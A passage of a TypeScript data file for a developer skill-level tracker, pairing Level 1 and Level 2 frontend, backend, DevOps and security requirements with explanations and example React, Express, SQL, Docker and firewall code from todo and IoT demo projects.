export type LevelStatus =
  | "✅ Far Exceeded"
  | "🟡 Mostly Met"
  | "🟠 Partially Met"
  | "🔴 Not Met";
export type TrackStatus = "exceeded" | "met" | "partial" | "not-met";

export interface Requirement {
  text: string;
  answer: string;
  code?: string;
  language?: string;
}

export interface ProjectRef {
  project: "todo-app" | "foresight-mini" | "foresight-2";
  label: string;
  path?: string;
  note: string;
  codeSnippet?: string;
  language?: string;
}

export interface Domain {
  name: "Frontend" | "Backend" | "DevOps" | "Security";
  requirements: Requirement[];
  keywords: string[];
  applicationNote: string;
  projectRefs: ProjectRef[];
  gaps?: string[];
  status: TrackStatus;
}

export interface Level {
  id: number;
  slug: string;
  title: string;
  subtitle: string;
  experience: string;
  overallStatus: LevelStatus;
  statusColor: string;
  domains: Domain[];
  selfCheck: string;
}

export interface GapItem {
  priority: number;
  title: string;
  description: string;
  status: "todo" | "in-progress" | "done";
  project: ("todo-app" | "foresight-mini" | "foresight-2")[];
}

export interface TrackSummary {
  track: string;
  estimatedLevel: string;
  notes: string;
  status: TrackStatus;
}

export const LEVELS: Level[] = [
  {
    id: 1,
    slug: "fresher",
    title: "Level 1",
    subtitle: "Fresher / Intern",
    experience: "0 – 6 months",
    overallStatus: "✅ Far Exceeded",
    statusColor: "green",
    selfCheck:
      "You can explain: what JSX compiles down to, why useState re-renders a component, the difference between PATCH and PUT, re-write an Express + pg CRUD route from scratch without looking at documentation, run the project's docker-compose, and explain why .env should not be committed to Git.",
    domains: [
      {
        name: "Frontend",
        status: "exceeded",
        requirements: [
          {
            text: "Semantic HTML tags, basic CSS (box model, Flexbox).",
            answer:
              "Use tags by meaning — <nav>, <header>, <button>, <ul><li> — not just <div> everywhere. They help browsers, screen readers, and SEO parse structure without CSS. Box model: content → padding → border → margin. Flexbox: display:flex makes a 1-D row or column; use justify-content/align-items to position children.",
            code: `/* Box model */
.card {
  width: 200px;     /* content */
  padding: 16px;    /* inner spacing */
  border: 1px solid #ccc;
  margin: 8px;      /* outer spacing */
}

/* Flexbox */
.row { display: flex; gap: 8px; align-items: center; }
.col { display: flex; flex-direction: column; }

/* Responsive: mobile-first */
.grid { display: flex; flex-direction: column; }
@media (min-width: 768px) {
  .grid { flex-direction: row; }
}`,
            language: "css",
          },
          {
            text: "JavaScript fundamentals: var/let/const, data types, array/object methods (map/filter/reduce), standard functions vs arrow functions.",
            answer:
              "var has function scope and hoists (avoid it). let/const have block scope; const prevents rebinding. Arrow functions inherit 'this' from the enclosing scope — unlike function declarations which bind their own 'this'.",
            code: `// var hoists — avoid
var x = 1; // accessible before declaration as undefined

// let/const — block scoped
const PI = 3.14;
let count = 0;

// Arrow vs regular function — 'this' difference
class Timer {
  seconds = 0;
  start() {
    // ✅ Arrow: inherits 'this' from Timer instance
    setInterval(() => { this.seconds++; }, 1000);

    // ❌ Regular: 'this' is undefined (strict) or window
    // setInterval(function() { this.seconds++; }, 1000);
  }
}

// Array methods
const nums = [1, 2, 3, 4];
const doubled  = nums.map(n => n * 2);        // [2, 4, 6, 8]
const evens    = nums.filter(n => n % 2 === 0); // [2, 4]
const sum      = nums.reduce((acc, n) => acc + n, 0); // 10`,
            language: "ts",
          },
          {
            text: "Basic React: component, props, useState, simple useEffect.",
            answer:
              "A component is a JS function returning JSX. Props are read-only parent→child data. useState(init) returns [value, setter]; calling setter schedules a re-render. useEffect(fn, []) runs fn once after the first render — ideal for initial data fetch.",
            code: `// useState — triggers re-render on change
function Counter() {
  const [count, setCount] = useState(0);
  return (
    <button onClick={() => setCount(count + 1)}>
      Clicked {count} times
    </button>
  );
}

// Props — typed, read-only
interface TodoItemProps {
  title: string;
  completed: boolean;
  onToggle: () => void;
}
function TodoItem({ title, completed, onToggle }: TodoItemProps) {
  return <div onClick={onToggle}>{title} {completed ? '✓' : '○'}</div>;
}

// useEffect — fetch on mount
useEffect(() => {
  fetch('/api/todos')
    .then(r => r.json())
    .then(setTodos);
}, []); // empty array = run once on mount`,
            language: "tsx",
          },
          {
            text: "Basic API calls using fetch/axios, displaying basic loading/error states.",
            answer:
              "fetch always resolves (even on 404/500) — you must check res.ok. axios auto-rejects non-2xx. Pattern: isLoading=true while fetching, catch to set error state, finally to clear loading.",
            code: `const [todos, setTodos]   = useState<Todo[]>([]);
const [loading, setLoading] = useState(true);
const [error, setError]     = useState<string | null>(null);

useEffect(() => {
  fetch('/api/todos')
    .then(res => {
      if (!res.ok) throw new Error(\`HTTP \${res.status}\`);
      return res.json();
    })
    .then(data  => setTodos(data))
    .catch(err  => setError(err.message))
    .finally(() => setLoading(false));
}, []);

if (loading) return <p>Loading…</p>;
if (error)   return <p className="text-red-400">Error: {error}</p>;
return <ul>{todos.map(t => <li key={t.id}>{t.title}</li>)}</ul>;`,
            language: "tsx",
          },
          {
            text: "Basic Git usage: clone/add/commit/push/pull, creating branches.",
            answer:
              "Git tracks snapshots, not diffs. Staging area lets you craft commits from partial changes. Branches are cheap pointers to commits — always create a branch for a feature, never commit directly to main.",
            code: `# Full flow: feature branch → PR → merge
git clone https://github.com/user/repo.git
git checkout -b feat/add-priority   # create + switch branch

# Make changes, then:
git add be-node-express/src/         # stage specific directory
git commit -m "feat: add priority field to todos"
git push origin feat/add-priority

# On main after PR merged:
git checkout main
git pull                             # sync remote → local
git branch -d feat/add-priority     # cleanup local branch`,
            language: "bash",
          },
        ],
        keywords: [
          "DOM",
          "JSX",
          "Virtual DOM",
          "npm/yarn",
          "ES6",
          "component tree",
          "controlled input",
          "console.log debugging",
        ],
        applicationNote:
          "fe-vite/src/App.tsx represents this level — one single large component, useState managing the todos list, fetch calls to the backend, no complex state management or child component extraction. Being able to read and explain every line in that file means you have reached Level 1 FE.",
        projectRefs: [
          {
            project: "todo-app",
            label: "fe-vite/src/App.tsx",
            path: "fe-vite/src/App.tsx",
            note: "Single component with useState + fetch — classic Level 1 FE pattern",
            language: "tsx",
            codeSnippet: `// fe-vite/src/App.tsx — full component
import { useState } from 'react';
import { BACKENDS } from './constants';
import { useAuth } from './hooks/useAuth';
import { useTodos } from './hooks/useTodos';
import BackendSwitcher from './components/BackendSwitcher';
import AuthForm from './components/AuthForm';
import AddTodoForm from './components/AddTodoForm';
import TodoList from './components/TodoList';

export default function App() {
  const [selectedBackend, setSelectedBackend] = useState(BACKENDS[0]);

  const auth = useAuth(selectedBackend);
  const isAuthReady = !selectedBackend.requiresAuth || auth.isAuthenticated;

  const { todos, isLoading, status, reload, add, toggle, remove } = useTodos({
    backend: selectedBackend,
    accessToken: auth.accessToken,
    isAuthReady,
    onAuthExpired: auth.refresh,
    onAuthFailed: auth.logout,
  });

  const needsLogin = selectedBackend.requiresAuth && !auth.isAuthenticated;

  return (
    <div className="min-h-screen bg-zinc-950 text-zinc-100 flex flex-col items-center py-12 px-4">
      <div className="w-full max-w-2xl space-y-6">
        <BackendSwitcher
          backends={BACKENDS}
          selected={selectedBackend}
          onChange={setSelectedBackend}  // switching backend re-triggers useEffect in useTodos
          onRefresh={reload}
          isLoading={isLoading}
          status={status}
        />

        {needsLogin ? (
          <AuthForm
            isSubmitting={auth.isSubmitting}
            error={auth.authError}
            onLogin={auth.login}
            onRegister={auth.register}
          />
        ) : (
          <div className="bg-zinc-900 border border-zinc-800 rounded-2xl">
            <AddTodoForm onAdd={add} />
            <TodoList todos={todos} onToggle={toggle} onDelete={remove} />
          </div>
        )}
      </div>
    </div>
  );
}`,
          },
        ],
        gaps: [],
      },
      {
        name: "Backend",
        status: "exceeded",
        requirements: [
          {
            text: "Ability to write a simple Express CRUD REST API (direct route handler, no layer separation required yet).",
            answer:
              "CRUD = Create/Read/Update/Delete mapped to POST/GET/PATCH/DELETE. At Level 1 all logic lives in the route handler — no controller/service split yet. The request body is parsed with express.json(), SQL is executed directly, and the result is sent back as JSON.",
            code: `import express from 'express';
import { Pool } from 'pg';

const app = express();
app.use(express.json());
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

// Level 1 pattern: all logic in the route handler
app.get('/api/todos', async (req, res) => {
  const result = await pool.query('SELECT * FROM todos');
  res.json(result.rows);
});

app.post('/api/todos', async (req, res) => {
  const { title } = req.body;
  const result = await pool.query(
    'INSERT INTO todos (title) VALUES ($1) RETURNING *',
    [title]
  );
  res.status(201).json(result.rows[0]);
});

app.listen(3000);`,
            language: "ts",
          },
          {
            text: "Basic SQL: SELECT/INSERT/UPDATE/DELETE, WHERE clause, understanding what a Primary Key is.",
            answer:
              "Primary Key uniquely identifies each row — usually SERIAL (auto-increment integer) or UUID. WHERE filters rows. Parameterize user input with $1,$2 placeholders to prevent SQL injection.",
            code: `-- Create table with PK
CREATE TABLE todos (
  id    SERIAL PRIMARY KEY,
  title TEXT NOT NULL,
  done  BOOLEAN DEFAULT FALSE
);

-- CRUD
SELECT * FROM todos WHERE done = false;
INSERT INTO todos (title) VALUES ('Buy milk') RETURNING *;
UPDATE todos SET done = true WHERE id = 1;
DELETE FROM todos WHERE id = 1;`,
            language: "sql",
          },
          {
            text: "Understanding which HTTP method is used for what, and basic status code meanings.",
            answer:
              "GET=read (idempotent), POST=create, PATCH=partial update, PUT=full replace, DELETE=remove. 200=OK, 201=Created, 400=Bad Request (your fault), 401=Unauthenticated, 403=Forbidden, 404=Not Found, 500=Server Error.",
            code: `// Correct HTTP method + status code usage
router.get('/todos',    ctrl.list);    // 200 OK
router.post('/todos',   ctrl.create);  // 201 Created
router.patch('/todos/:id', ctrl.update); // 200 OK
router.delete('/todos/:id', ctrl.remove); // 204 No Content

// In controller:
export const create = async (req, res) => {
  const todo = await todoService.create(req.body);
  res.status(201).json(todo);  // 201 not 200 for creation
};

export const remove = async (req, res) => {
  await todoService.delete(req.params.id);
  res.status(204).send();  // 204 = success, no body
};`,
            language: "ts",
          },
          {
            text: "Reading/writing environment variables via .env.",
            answer:
              "Never hardcode secrets in source. Use dotenv to load .env at runtime. Commit .env.example (with placeholder values), never .env itself. In production, inject vars through the container environment.",
            code: `# .env (git-ignored)
DATABASE_URL=postgresql://postgres:postgres@localhost:5432/todo_db
JWT_ACCESS_SECRET=super-secret-change-me
PORT=5001

# .env.example (committed — shows required keys, safe values)
DATABASE_URL=postgresql://user:password@host:5432/dbname
JWT_ACCESS_SECRET=replace-with-a-random-secret
PORT=5001

// src/config/env.ts
import 'dotenv/config';
export const env = {
  dbUrl: process.env.DATABASE_URL!,
  jwtSecret: process.env.JWT_ACCESS_SECRET!,
  port: Number(process.env.PORT ?? 3000),
};`,
            language: "ts",
          },
          {
            text: "Hands-on Action Case: Bare-metal Systemd Service & Direct psql CLI Operations on Ubuntu VM.",
            answer:
              "Deploying be-node-express directly on Ubuntu VM using systemd (/etc/systemd/system/todo-api.service), inspecting live logs with journalctl, configuring Nginx reverse proxy, and using psql CLI directly to manage database, users, and schemas.",
            code: `# 1. Create Systemd Service (/etc/systemd/system/todo-api.service)
[Unit]
Description=Todo Node Express API Service
After=network.target postgresql.service

[Service]
Type=simple
User=ubuntu
WorkingDirectory=/home/ubuntu/todo-app/be-node-express
ExecStart=/usr/bin/npm start
Restart=always
Environment=PORT=5001
Environment=DATABASE_URL=postgresql://postgres:postgres@localhost:5432/todo_db

[Install]
WantedBy=multi-user.target

# 2. Control service & read logs
sudo systemctl daemon-reload && sudo systemctl start todo-api
sudo journalctl -u todo-api -f --no-pager

# 3. Direct psql CLI in Ubuntu VM
docker exec -it todo-postgres-dev psql -U postgres -d todo_db
SELECT id, title, completed FROM todos LIMIT 5;`,
            language: "bash",
          },
        ],
        keywords: [
          "HTTP method",
          "status code",
          "JSON",
          "request/response",
          ".env",
          "connection string",
          "pg/mysql2 driver",
        ],
        applicationNote:
          "The original version (before refactoring) of be-node-express/src/index.ts — all logic in a single file, no controller/service separation, no auth, a single todos table — is a classic Level 1 BE pattern. View git history (git log -p -- be-node-express/src/index.ts) to see that original version.",
        projectRefs: [
          {
            project: "todo-app",
            label: "be-node-express/src/ (original)",
            path: "be-node-express/src",
            note: "Git history shows the original single-file pattern before refactoring",
            language: "ts",
            codeSnippet: `// Level 1 BE pattern: all logic in the route handler (no layers yet)
// git log -p -- be-node-express/src/index.ts to see original version
import express from 'express';
import { Pool } from 'pg';

const app = express();
app.use(express.json());
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

app.get('/api/todos', async (req, res) => {
  const result = await pool.query('SELECT * FROM todos ORDER BY created_at DESC');
  res.json(result.rows);
});

app.post('/api/todos', async (req, res) => {
  const { title } = req.body;
  const result = await pool.query(
    'INSERT INTO todos (title) VALUES ($1) RETURNING *',
    [title]
  );
  res.status(201).json(result.rows[0]);
});

app.patch('/api/todos/:id', async (req, res) => {
  const { completed } = req.body;
  const result = await pool.query(
    'UPDATE todos SET completed = $1 WHERE id = $2 RETURNING *',
    [completed, req.params.id]
  );
  res.json(result.rows[0]);
});

app.delete('/api/todos/:id', async (req, res) => {
  await pool.query('DELETE FROM todos WHERE id = $1', [req.params.id]);
  res.status(204).send();
});

app.listen(3000, () => console.log('Server running on port 3000'));`,
          },
        ],
        gaps: [],
      },
      {
        name: "DevOps",
        status: "exceeded",
        requirements: [
          {
            text: "Basic Docker usage: docker build, docker run, docker ps, docker logs, understanding the difference between an image and a container.",
            answer:
              "Image = blueprint (class). Container = running instance (object). Build packages code into an immutable image; run creates a writable container from it. Multiple containers can run from the same image.",
            code: `# Build image from Dockerfile in current directory
docker build -t todo-be:latest .

# Run container: map host port 5001 → container port 5001
docker run -d -p 5001:5001 --name todo-be todo-be:latest

# Inspect running containers
docker ps

# Tail logs
docker logs -f todo-be

# Stop + remove
docker stop todo-be && docker rm todo-be

# Image vs Container:
# Dockerfile ---(docker build)---> Image (immutable blueprint)
# Image      ---(docker run)----> Container (live, writable)`,
            language: "bash",
          },
          {
            text: "Ability to read and understand a simple Dockerfile.",
            answer:
              "Each instruction is a layer. Docker caches layers — COPY package.json first so npm install only re-runs when dependencies change, not every code change. CMD is the startup command.",
            code: `FROM node:18-alpine        # Base image layer
WORKDIR /app               # Container working directory

# Copy manifests FIRST — cached if package.json unchanged
COPY package*.json ./
RUN npm install            # Layer cached on clean package.json

# Copy source AFTER — only invalidates source layer
COPY . .

EXPOSE 5001
CMD ["node", "index.js"]   # Container startup command`,
            language: "dockerfile",
          },
          {
            text: "Understanding why docker-compose up is used to run multiple services simultaneously.",
            answer:
              "docker-compose defines the full multi-service stack in one YAML file. Services communicate via service names (not localhost) on a shared virtual network. depends_on ensures db starts before the backend attempts to connect.",
            code: `services:
  db:
    image: postgres:15-alpine
    environment:
      POSTGRES_USER: postgres
      POSTGRES_DB: todo_db
    volumes:
      - pgdata:/var/lib/postgresql/data
    networks: [todo-network]

  be-node-express:
    build: ./be-node-express
    ports: ["5001:5001"]
    environment:
      # 'db' resolves to the postgres container via virtual network
      DATABASE_URL: postgresql://postgres:postgres@db:5432/todo_db
    depends_on: [db]          # starts db container first
    networks: [todo-network]

networks:
  todo-network:
volumes:
  pgdata:`,
            language: "yaml",
          },
          {
            text: "Hands-on Action Case: Ubuntu Server Administration & UFW Firewall Setup.",
            answer:
              "User management (adduser, sudoers), inspecting open ports with ss -tulpn, process monitoring with ps aux / top, and setting up UFW firewall to block direct database port exposure while allowing HTTP/HTTPS/SSH.",
            code: `# Create non-root user
sudo adduser devuser && sudo usermod -aG sudo devuser

# Check listening ports & processes
sudo ss -tulpn
ps aux --sort=-%cpu | head -n 10

# UFW Firewall setup
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp   # SSH
sudo ufw allow 80/tcp   # HTTP
sudo ufw allow 443/tcp  # HTTPS
sudo ufw enable`,
            language: "bash",
          },
        ],
        keywords: [
          "image",
          "container",
          "Dockerfile",
          "docker-compose",
          "port mapping",
          "volume (conceptual)",
        ],
        applicationNote:
          'Running docker-compose.yml via `docker compose up -d db` and explaining why db must be "Up" before be-node-express can connect — this is Level 1 DevOps.',
        projectRefs: [
          {
            project: "todo-app",
            label: "docker-compose.yml",
            path: "docker-compose.yml",
            note: "Multi-service compose with depends_on — start here",
            language: "yaml",
            codeSnippet: `services:
  db:
    image: postgres:15-alpine
    environment:
      POSTGRES_USER: postgres
      POSTGRES_PASSWORD: postgres
      POSTGRES_DB: todo_db
    volumes:
      - pgdata_dev:/var/lib/postgresql/data
      - ./db/init.sql:/docker-entrypoint-initdb.d/init.sql
    networks:
      - todo-network

  be-node-express:
    build: ./be-node-express
    ports:
      - "5001:5001"
    environment:
      DATABASE_URL: postgresql://postgres:postgres@db:5432/todo_db
    depends_on:
      - db
    networks:
      - todo-network`,
          },
          {
            project: "foresight-mini",
            label: "docker-compose.yml",
            path: "docker-compose.yml",
            note: "Foresight-mini: full IoT pipeline — MQTT, NATS, Postgres, Redis, adapter, worker, api, frontend all declared",
            language: "yaml",
            codeSnippet: `# foresight-mini/docker-compose.yml — full IoT pipeline in one file
services:
  postgres:
    image: postgres:16-alpine
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U foresight"]
      interval: 2s
      retries: 20

  redis:
    image: redis:7-alpine   # Read cache for sensor readings (10s TTL)

  mosquitto:
    image: eclipse-mosquitto:2   # IoT MQTT broker

  nats:
    image: nats:2-alpine         # Internal event bus

  simulator:
    build: ./services/simulator  # Fake IoT device → MQTT
    depends_on: [mosquitto]

  adapter:
    build: ./services/adapter    # MQTT → NATS (protocol translation)
    depends_on: [mosquitto, nats]

  worker:
    build: ./services/worker     # NATS → Postgres (persist readings)
    depends_on:
      postgres: { condition: service_healthy }

  api:
    build: ./services/api        # GraphQL query layer
    ports: ["4000:4000"]
    depends_on:
      postgres: { condition: service_healthy }
      redis: { condition: service_healthy }

  frontend:
    build: ./frontend
    ports: ["5173:5173"]
    environment:
      VITE_API_URL: http://localhost:4000/graphql`,
          },
        ],
        gaps: [],
      },
      {
        name: "Security",
        status: "exceeded",
        requirements: [
          {
            text: "Knowing NEVER to store passwords in plaintext.",
            answer:
              "If the database is breached, plaintext passwords expose every user's credentials immediately — and users reuse passwords across sites. Hashing (bcrypt) is one-way: you verify by hashing the attempt and comparing digests, never by decrypting.",
            code: `// ❌ NEVER do this
await db.query('INSERT INTO users (password) VALUES ($1)', [password]);

// ✅ Always hash first
import bcrypt from 'bcrypt';
const hash = await bcrypt.hash(password, 12); // 12 salt rounds
await db.query('INSERT INTO users (password_hash) VALUES ($1)', [hash]);

// Verify on login (no decryption — compare hashes)
const valid = await bcrypt.compare(plaintext, storedHash);
// 2^12 = 4096 iterations — slow enough to resist brute-force`,
            language: "ts",
          },
          {
            text: "Knowing NEVER to commit .env/secrets files to Git.",
            answer:
              "Git history is permanent. A secret committed once can be extracted even after deletion. Use .gitignore to block .env. If a secret leaks, rotate it immediately — deleting the commit is not sufficient.",
            code: `# .gitignore — prevents accidental commits
.env
.env.local
.env.production

# What to commit instead:
.env.example   # template with placeholder values only

# Check nothing sensitive is staged:
git diff --cached

# If you accidentally committed .env:
git rm --cached .env        # unstage from index
git commit -m "chore: remove .env from tracking"
# Then ROTATE the secrets — the commit hash still exists in history`,
            language: "bash",
          },
          {
            text: "Knowing what HTTPS is and how it conceptually differs from HTTP.",
            answer:
              "HTTP sends data in plaintext — any network observer (ISP, café WiFi, MITM) can read passwords and tokens. HTTPS wraps HTTP in TLS: the server presents a certificate, client verifies it, then all traffic is encrypted end-to-end.",
            code: `# HTTP — plaintext, visible to network observers:
# Client → Server: POST /login\r\npassword=secret123
#                              ↑ readable by anyone on the network

# HTTPS — TLS encrypted:
# 1. Server presents certificate (proves identity)
# 2. Client verifies cert chain against trusted CAs
# 3. Key exchange (ECDHE) establishes session keys
# 4. All data encrypted: looks like random bytes to observers

# In Express — HTTPS is terminated at the load balancer/reverse proxy
# (nginx, Cloudflare, AWS ALB), not in the Node app itself.
# The Node app only sees HTTP on the internal network.`,
            language: "bash",
          },
        ],
        keywords: [
          "plaintext password (knowing it's wrong)",
          ".gitignore",
          "HTTPS vs HTTP",
        ],
        applicationNote:
          "be-node-express/.gitignore already ignores .env — explaining why this file should not be uploaded to Git (it contains actual JWT_ACCESS_SECRET, DATABASE_URL) is sufficient for Level 1 Security.",
        projectRefs: [
          {
            project: "todo-app",
            label: "be-node-express/.gitignore",
            path: "be-node-express/.gitignore",
            note: ".env excluded — contains JWT_ACCESS_SECRET, DATABASE_URL — never commit secrets",
            language: "bash",
            codeSnippet: `# be-node-express/.gitignore — key security entries
node_modules/
dist/

# NEVER commit these — they contain real secrets:
# JWT_ACCESS_SECRET, JWT_REFRESH_SECRET, DATABASE_URL, SESSION_SECRET
.env
.env.local
.env.production

# Runtime artifacts
*.log
npm-debug.log*

# Build output
build/
coverage/

# Rule: .env.example (no real values) CAN be committed as documentation.
# .env (real values) must ALWAYS be in .gitignore.
# Run: git rm --cached .env   if you accidentally committed it.`,
          },
        ],
        gaps: [],
      },
    ],
  },
  {
    id: 2,
    slug: "junior",
    title: "Level 2",
    subtitle: "Junior",
    experience: "6 months – 1.5 years",
    overallStatus: "✅ Far Exceeded",
    statusColor: "green",
    selfCheck:
      "You can explain: why passwords must be hashed rather than 2-way encrypted, what 3 parts constitute a JWT and who verifies it, how JOIN differs from a subquery, how to debug basic CORS errors when FE calls a BE on a different port, and how to write a docker-compose.yml for 2 dependent services from scratch.",
    domains: [
      {
        name: "Frontend",
        status: "partial",
        requirements: [
          {
            text: "Properly understanding the useEffect dependency array, avoiding infinite loops and stale closures.",
            answer:
              "The deps array tells React when to re-run the effect. Missing a dep → stale closure (effect reads an outdated value). Including a value that changes every render → infinite loop. Fix stale timers with functional updater form setCount(prev => prev + 1) instead of capturing the variable.",
            code: `// ❌ Infinite loop: count changes → effect runs → setCount → count changes…
useEffect(() => {
  setCount(count + 1);
}, [count]);

// ❌ Stale closure: closes over count=0 forever
useEffect(() => {
  const id = setInterval(() => {
    setCount(count + 1); // always 0+1=1, stuck at 1
  }, 1000);
  return () => clearInterval(id);
}, []); // count not in deps

// ✅ Functional updater — no stale closure, no count in deps
useEffect(() => {
  const id = setInterval(() => {
    setCount(prev => prev + 1); // always correct
  }, 1000);
  return () => clearInterval(id);
}, []);

// ✅ Fetch on id change — correct deps
useEffect(() => {
  fetch('/api/todos/' + id).then(r => r.json()).then(setTodo);
}, [id]); // re-runs only when id changes`,
            language: "tsx",
          },
          {
            text: "Logical child component decomposition (reusability), passing typed props.",
            answer:
              "Extract sub-components when a piece of UI can be reused or independently tested. TypeScript interfaces on props catch bugs at compile time and serve as documentation. Avoid over-decomposing tiny things — extract when there's a clear boundary.",
            code: `// Typed props interface
interface TodoItemProps {
  id: number;
  title: string;
  completed: boolean;
  onToggle: (id: number) => void;
  onDelete: (id: number) => void;
}

// Child component
export function TodoItem({ id, title, completed, onToggle, onDelete }: TodoItemProps) {
  return (
    <li className="flex items-center gap-2">
      <input
        type="checkbox"
        checked={completed}
        onChange={() => onToggle(id)}
      />
      <span className={completed ? 'line-through text-gray-400' : ''}>
        {title}
      </span>
      <button onClick={() => onDelete(id)}>✕</button>
    </li>
  );
}

// Parent composes children
export function TodoList({ todos, onToggle, onDelete }) {
  return (
    <ul>
      {todos.map(todo => (
        <TodoItem key={todo.id} {...todo}
          onToggle={onToggle} onDelete={onDelete} />
      ))}
    </ul>
  );
}`,
            language: "tsx",
          },
          {
            text: "Form management: controlled inputs, basic validation.",
            answer:
              "Controlled input: React state is the single source of truth — value={state} + onChange={setState}. Validate on submit (not on every keystroke) to avoid jittery UX. Show errors adjacent to the field.",
            code: `function AddTodoForm({ onAdd }: { onAdd: (title: string) => void }) {
  const [title, setTitle] = useState('');
  const [error, setError] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!title.trim()) return setError('Title is required');
    if (title.length > 255) return setError('Max 255 characters');
    onAdd(title.trim());
    setTitle('');
    setError('');
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        value={title}                        // controlled
        onChange={e => {
          setTitle(e.target.value);
          setError('');                      // clear error on type
        }}
        placeholder="New todo…"
        className="border rounded px-2 py-1"
      />
      {error && <p className="text-red-400 text-sm mt-1">{error}</p>}
      <button type="submit">Add</button>
    </form>
  );
}`,
            language: "tsx",
          },
          {
            text: "CSS framework (Tailwind) and basic responsive design (mobile-first).",
            answer:
              "Tailwind utility classes replace custom CSS files. Mobile-first: write the default styles for small screens, then add breakpoint prefixes (md:, lg:) to override for larger screens. This prevents the common mistake of building desktop-first.",
            code: `{/* Mobile-first responsive grid */}
<div className="
  flex flex-col gap-4 p-4   {/* mobile: vertical stack */}
  md:flex-row               {/* tablet+: horizontal row */}
">
  <aside className="w-full md:w-64">Sidebar</aside>
  <main  className="flex-1">Content</main>
</div>

{/* Conditional styling */}
<span className={[
  'px-2 py-1 rounded text-xs font-mono',
  completed
    ? 'bg-emerald-900 text-emerald-300'  // done
    : 'bg-gray-800 text-gray-400',       // pending
].join(' ')}>
  {completed ? 'Done' : 'Todo'}
</span>`,
            language: "tsx",
          },
          {
            text: "Basic usage of useMemo/useCallback.",
            answer:
              "useMemo memoizes an expensive computed value. useCallback memoizes a function reference so child components wrapped in React.memo don't re-render. The most common mistake: using them everywhere prematurely — they add overhead. Only use them when you measure a real performance problem.",
            code: `// useMemo — skip re-computing sorted list every render
const sortedTodos = useMemo(
  () => [...todos].sort((a, b) => a.title.localeCompare(b.title)),
  [todos] // only re-compute when todos array changes
);

// useCallback — stable reference so TodoItem doesn't re-render
const handleToggle = useCallback((id: number) => {
  setTodos(prev =>
    prev.map(t => t.id === id ? { ...t, completed: !t.completed } : t)
  );
}, []); // no deps: uses functional updater, doesn't close over state

// React.memo — skips render if props unchanged
const TodoItem = React.memo(function TodoItem({ id, title, onToggle }) {
  return <li onClick={() => onToggle(id)}>{title}</li>;
});`,
            language: "tsx",
          },
        ],
        keywords: [
          "custom hook",
          "prop drilling",
          "controlled/uncontrolled input",
          "Tailwind utility classes",
          "TypeScript interface",
          "key prop in list rendering",
          "error boundary (conceptual)",
        ],
        applicationNote:
          "fe-vite/src/App.tsx and fe-nextjs use TypeScript + Tailwind and feature a backend switcher toggle — reading the code that switches backends (pinging connection status) is a great example of managing side-effects with useEffect.",
        projectRefs: [
          {
            project: "todo-app",
            label: "fe-vite/src/hooks/useAuth.ts + useTodos.ts",
            path: "fe-vite/src/hooks/",
            note: "Backend switcher toggle demonstrates useEffect dependency management — two hooks, two different dependency patterns",
            language: "ts",
            codeSnippet: `// hooks/useAuth.ts
// When the user clicks a different backend in the switcher, \`backend.id\`
// changes. This useEffect re-reads that backend's stored session from
// localStorage instead of keeping the previous backend's tokens in state.
export function useAuth(backend: BackendOption) {
  const [auth, setAuth] = useState<StoredAuth | null>(() =>
    backend.requiresAuth ? loadStoredAuth(backend.id) : null
  );

  useEffect(() => {
    // Runs every time the selected backend changes.
    // Stale closure is avoided because \`backend.id\` is in the dep array —
    // the effect always captures the latest backend reference.
    setAuth(backend.requiresAuth ? loadStoredAuth(backend.id) : null);
    setAuthError(null);
  }, [backend.id, backend.requiresAuth]);  // ← deps = only what the effect reads


// hooks/useTodos.ts
// \`load\` is wrapped in useCallback so its identity only changes when
// \`backend\`, \`isAuthReady\`, or \`callWithAuthRetry\` changes.
// The useEffect below then re-fires automatically whenever \`load\` changes,
// which is exactly when we want to re-fetch (new backend selected, auth state changed).
const load = useCallback(async () => {
  if (!isAuthReady) { setTodos([]); setStatus(null); return; }
  setIsLoading(true);
  setStatus({ type: 'loading', text: \`Connecting to \${backend.name}...\` });
  try {
    const data = await callWithAuthRetry((token) => fetchTodos(backend, token));
    setTodos(data);
    setStatus({ type: 'success', text: \`Connected to Port \${backend.port}\` });
  } catch (err) {
    setTodos([]);
    setStatus({ type: 'error', text: \`Failed to connect to \${backend.name}\` });
  } finally {
    setIsLoading(false);
  }
}, [backend, isAuthReady, callWithAuthRetry]);  // ← all reads listed

useEffect(() => {
  load();
}, [load]);  // ← load identity changes → effect re-runs → fresh fetch`,
          },
          {
            project: "foresight-2",
            label: "foresight-cloud-bms/src/hooks/data/buildings/",
            path: "repo/foresight-cloud-bms/src/hooks/data/buildings",
            note: "Enterprise 3-file hook pattern: index.types.ts (types) + query.ts (queryOptions factory) + use-buildings/index.ts (hook)",
            language: "ts",
            codeSnippet: `// 3-FILE PATTERN for every data hook in foresight-cloud-bms

// 1. index.types.ts — GraphQL response shape
export type Building = {
  id: string; name: string; access: string;
  info: BuildingInfo | null;
};
export type BuildingsResponse = { foresightEntitiesByIDs: ReadonlyArray<BuildingsEntity> };
export type BuildingsVariables = { ids: ReadonlyArray<string> };

// 2. query.ts — queryOptions factory (TanStack Query + Apollo)
export const buildingsQueryOptions = (apolloClient: ApolloClient, ids: ReadonlyArray<string>) =>
  queryOptions({
    queryKey: ["buildings", { ids: [...ids].sort() }],
    queryFn: async () => {
      const result = await apolloClient.query({
        query: BuildingsQuery,
        variables: { ids: [...ids] },
      });
      return result.data?.foresightEntitiesByIDs ?? null;
    },
    enabled: ids.length > 0,
    staleTime: Number.POSITIVE_INFINITY,  // buildings rarely change
    gcTime: Number.POSITIVE_INFINITY,
  });

// 3. use-buildings/index.ts — the actual hook (one-liner)
export const useBuildings = ({ ids }: { ids: ReadonlyArray<string> }) => {
  const apolloClient = useApolloClient();
  return useQuery(buildingsQueryOptions(apolloClient, ids));
};`,
          },
        ],
        gaps: [
          "Missing: extracting TodoItem, TodoList, and AddTodoForm into separate standalone components — good refactoring exercise.",
        ],
      },
      {
        name: "Backend",
        status: "exceeded",
        requirements: [
          {
            text: "Separating basic architecture: routes → controller.",
            answer:
              "Routes register endpoints and delegate to controllers. Controllers handle HTTP concerns (parse req, call business logic, send res). This separation means you can test controllers without an HTTP server, and swap route structures without touching logic.",
            code: `// routes/todo.routes.ts — only registration
router.get('/',    todoController.list);
router.post('/',   validateBody(createTodoSchema), todoController.create);
